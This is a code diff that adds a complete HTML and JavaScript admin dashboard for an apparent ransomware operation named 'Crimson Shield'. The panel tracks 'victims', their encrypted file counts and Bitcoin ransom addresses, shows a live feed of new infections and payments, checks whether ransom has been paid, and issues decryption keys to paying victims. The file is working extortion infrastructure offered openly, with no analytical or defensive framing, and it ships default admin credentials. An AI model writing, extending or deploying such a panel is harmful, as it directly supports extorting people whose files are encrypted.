@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💀 Crimson Shield - Admin Dashboard</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            min-height: 100vh;
+        }
+        
+        .login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #0a0a0a;
+        }
+        
+        .login-box {
+            background: #111;
+            border: 2px solid #ff0000;
+            padding: 40px;
+            border-radius: 10px;
+            width: 400px;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.3);
+        }
+        
+        .login-box h1 {
+            color: #ff0000;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 2rem;
+        }
+        
+        .login-box input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background: #1a1a1a;
+            border: 1px solid #ff0000;
+            color: #00ff00;
+            border-radius: 5px;
+            font-size: 1rem;
+        }
+        
+        .login-box button {
+            width: 100%;
+            padding: 12px;
+            background: #ff0000;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        
+        .login-box button:hover {
+            background: #cc0000;
+        }
+        
+        .error {
+            color: #ff0000;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .dashboard {
+            display: none;
+            padding: 20px;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            border-bottom: 2px solid #ff0000;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            color: #ff0000;
+            font-size: 2rem;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .stat-card {
+            background: #111;
+            border: 1px solid #ff0000;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .stat-card h3 {
+            color: #ff4444;
+            font-size: 0.9rem;
+            margin-bottom: 10px;
+        }
+
+        .stat-card .number {
+            color: #00ff00;
+            font-size: 2.5rem;
+            font-weight: bold;
+        }
+
+        .victims-table {
+            background: #111;
+            border: 1px solid #ff0000;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 20px;
+        }
+
+        .victims-table table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .victims-table th {
+            background: #1a1a1a;
+            color: #ff0000;
+            padding: 12px;
+            text-align: left;
+            border-bottom: 2px solid #ff0000;
+        }
+
+        .victims-table td {
+            padding: 12px;
+            border-bottom: 1px solid #333;
+            color: #00ff00;
+        }
+
+        .victims-table tr:hover {
+            background: #1a1a1a;
+        }
+
+        .status-paid {
+            color: #00ff00;
+        }
+
+        .status-unpaid {
+            color: #ff0000;
+        }
+
+        .status-decrypted {
+            color: #00ffaa;
+        }
+
+        .logout-btn {
+            padding: 10px 20px;
+            background: #ff0000;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .logout-btn:hover {
+            background: #cc0000;
+        }
+
+        .live-feed {
+            margin-top: 20px;
+            padding: 20px;
+            background: #111;
+            border: 1px solid #ff0000;
+            border-radius: 10px;
+        }
+
+        .live-feed h3 {
+            color: #ff0000;
+            margin-bottom: 10px;
+        }
+
+        .feed-item {
+            color: #00ff00;
+            padding: 5px 0;
+            border-bottom: 1px solid #333;
+        }
+
+        .payment-check-btn {
+            padding: 5px 15px;
+            background: #ff8800;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+
+        .decrypt-btn {
+            padding: 5px 15px;
+            background: #00ff00;
+            color: black;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+
+        .btc-address {
+            color: #ff8800;
+            font-size: 0.8rem;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        .live-dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: #00ff00;
+            border-radius: 50%;
+            animation: blink 1s infinite;
+            margin-right: 10px;
+        }
+    </style>
+</head>
+<body>
+    <!-- LOGIN SCREEN -->
+    <div id="loginContainer" class="login-container">
+        <div class="login-box">
+            <h1>🔴 CRIMSON SHIELD</h1>
+            <h2 style="color: #ff4444; text-align: center; font-size: 1rem; margin-bottom: 20px;">ADMIN PANEL</h2>
+            <input type="text" id="username" placeholder="Username" value="admin">
+            <input type="password" id="password" placeholder="Password" value="admin123">
+            <button onclick="login()">🔓 ACCESS DASHBOARD</button>
+            <div id="loginError" class="error"></div>
+        </div>
+    </div>
+
+    <!-- DASHBOARD -->
+    <div id="dashboard" class="dashboard">
+        <div class="header">
+            <h1>💀 CRIMSON SHIELD DASHBOARD</h1>
+            <div>
+                <span class="live-dot"></span>
+                <span style="color: #00ff00;">LIVE</span>
+                <button class="logout-btn" onclick="logout()">🚪 Logout</button>
+            </div>
+        </div>
+
+        <div class="stats-grid" id="statsGrid">
+            <div class="stat-card">
+                <h3>👥 TOTAL VICTIMS</h3>
+                <div class="number" id="totalVictims">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>💰 PAID VICTIMS</h3>
+                <div class="number" id="paidVictims">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>₿ TOTAL BTC</h3>
+                <div class="number" id="totalBTC">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>⚡ ACTIVE VICTIMS</h3>
+                <div class="number" id="activeVictims">0</div>
+            </div>
+        </div>
+
+        <div class="live-feed">
+            <h3>📡 LIVE VICTIM FEED</h3>
+            <div id="liveFeed"></div>
+        </div>
+
+        <div class="victims-table">
+            <h3 style="padding: 15px; color: #ff0000;">📋 VICTIM DATABASE</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Files</th>
+                        <th>BTC Address</th>
+                        <th>Registered</th>
+                        <th>Status</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="victimsTableBody">
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <script>
+        let token = null;
+        let socket = null;
+
+        // ===== LOGIN =====
+        async function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const errorDiv = document.getElementById('loginError');
+
+            try {
+                const response = await fetch('/api/admin/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+
+                const data = await response.json();
+                
+                if (data.success) {
+                    token = data.token;
+                    document.getElementById('loginContainer').style.display = 'none';
+                    document.getElementById('dashboard').style.display = 'block';
+                    connectWebSocket();
+                    loadDashboard();
+                    loadVictims();
+                } else {
+                    errorDiv.textContent = '❌ Invalid credentials';
+                }
+            } catch (error) {
+                errorDiv.textContent = '❌ Connection error';
+            }
+        }
+
+        // ===== LOGOUT =====
+        function logout() {
+            token = null;
+            document.getElementById('loginContainer').style.display = 'flex';
+            document.getElementById('dashboard').style.display = 'none';
+            if (socket) {
+                socket.close();
+            }
+        }
+
+        // ===== WEB SOCKET =====
+        function connectWebSocket() {
+            socket = new WebSocket('ws://' + window.location.host);
+            
+            socket.onopen = () => {
+                console.log('🔌 WebSocket connected');
+            };
+
+            socket.onmessage = (event) => {
+                const data = JSON.parse(event.data);
+                if (data.type === 'new_victim') {
+                    addFeedItem(`🆕 New victim registered: ${data.victim.id}`);
+                    loadDashboard();
+                    loadVictims();
+                }
+                if (data.type === 'payment_confirmed') {
+                    addFeedItem(`💰 Payment confirmed for victim: ${data.victimId}`);
+                    loadDashboard();
+                    loadVictims();
+                }
+            };
+        }
+
+        // ===== ADD FEED ITEM =====
+        function addFeedItem(message) {
+            const feed = document.getElementById('liveFeed');
+            const item = document.createElement('div');
+            item.className = 'feed-item';
+            const time = new Date().toLocaleTimeString();
+            item.textContent = `[${time}] ${message}`;
+            feed.insertBefore(item, feed.firstChild);
+            if (feed.children.length > 20) {
+                feed.removeChild(feed.lastChild);
+            }
+        }
+
+        // ===== LOAD DASHBOARD =====
+        async function loadDashboard() {
+            try {
+                const response = await fetch('/api/admin/dashboard', {
+                    headers: { 'Authorization': token }
+                });
+                const data = await response.json();
+                
+                document.getElementById('totalVictims').textContent = data.totalVictims;
+                document.getElementById('paidVictims').textContent = data.paidVictims;
+                document.getElementById('totalBTC').textContent = data.totalBTC.toFixed(1);
+                document.getElementById('activeVictims').textContent = data.activeVictims;
+            } catch (error) {
+                console.error('Failed to load dashboard:', error);
+            }
+        }
+
+        // ===== LOAD VICTIMS =====
+        async function loadVictims() {
+            try {
+                const response = await fetch('/api/admin/victims', {
+                    headers: { 'Authorization': token }
+                });
+                const victims = await response.json();
+                
+                const tbody = document.getElementById('victimsTableBody');
+                tbody.innerHTML = '';
+                
+                victims.slice().reverse().forEach(victim => {
+                    const row = document.createElement('tr');
+                    
+                    const status = victim.paid ? 
+                        (victim.decrypted ? '<span class="status-decrypted">🔓 Decrypted</span>' : '<span class="status-paid">✅ Paid</span>') : 
+                        '<span class="status-unpaid">❌ Unpaid</span>';
+                    
+                    const actions = victim.paid && !victim.decrypted ?
+                        `<button class="decrypt-btn" onclick="generateKey('${victim.id}')">🔑 Generate Key</button>` :
+                        (victim.decrypted ? '✅ Done' : `<button class="payment-check-btn" onclick="checkPayment('${victim.id}')">💳 Check</button>`);
+                    
+                    row.innerHTML = `
+                        <td>${victim.id.substring(0, 8)}</td>
+                        <td>${victim.filesEncrypted}</td>
+                        <td class="btc-address">${victim.btcAddress.substring(0, 12)}...</td>
+                        <td>${new Date(victim.registeredAt).toLocaleDateString()}</td>
+                        <td>${status}</td>
+                        <td>${actions}</td>
+                    `;
+                    tbody.appendChild(row);
+                });
+            } catch (error) {
+                console.error('Failed to load victims:', error);
+            }
+        }
+
+        // ===== CHECK PAYMENT =====
+        async function checkPayment(victimId) {
+            try {
+                const response = await fetch('/api/admin/check-payment', {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': token,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ victimId })
+                });
+                const data = await response.json();
+                
+                if (data.paid) {
+                    alert('💰 Payment confirmed! You can now generate decryption key.');
+                    loadVictims();
+                    loadDashboard();
+                } else {
+                    alert('❌ No payment detected yet.');
+                }
+            } catch (error) {
+                alert('❌ Error checking payment');
+            }
+        }
+
+        // ===== GENERATE DECRYPTION KEY =====
+        async function generateKey(victimId) {
+            if (!confirm('Generate decryption key for this victim?')) return;
+            
+            try {
+                const response = await fetch('/api/admin/generate-key', {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': token,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ victimId })
+                });
+                const data = await response.json();
+                
+                if (data.success) {
+                    alert(`🔑 Decryption Key: ${data.decryptionKey}\n\nSend this to the victim to unlock their files.`);
+                    loadVictims();
+                    loadDashboard();
+                } else {
+                    alert('❌ Failed to generate key: ' + (data.error || 'Unknown error'));
+                }
+            } catch (error) {
+                alert('❌ Error generating key');
+            }
+        }
+
+        // ===== ENTER KEY ON LOGIN =====
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                login();
+            }
+        });
+
+        // Check if already logged in
+        if (token) {
+            document.getElementById('loginContainer').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'block';
+            connectWebSocket();
+            loadDashboard();
+            loadVictims();
+        }
+    </script>
+</body>
+</html>
